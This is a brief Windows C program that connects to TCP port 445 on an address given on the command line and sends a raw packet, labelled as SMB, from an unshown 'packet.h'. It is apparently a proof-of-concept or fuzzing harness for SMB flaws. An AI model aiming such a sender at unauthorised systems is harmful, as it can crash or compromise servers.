#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#pragma comment(lib, "ws2_32.lib")
#include "packet.h"
int send_packet(SOCKET sock) {
	//char response[8] = { 0 };
	send(sock, (const char*)buf, sizeof(buf), 0);
	//recv(sock, response, sizeof(response), 0);
	return 0;
}
int main(int argc, char* argv[]) {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	int err = 0;
	WSAStartup(wVersionRequested, &wsaData);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	InetPtonA(AF_INET, argv[1], &client.sin_addr);
	connect(sock, (sockaddr*)&client, sizeof(client));
	printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG*)(buf+4), *(PULONG*)(buf + 16));
	send_packet(sock);

	printf("--------Done!\n");
	return 0;
}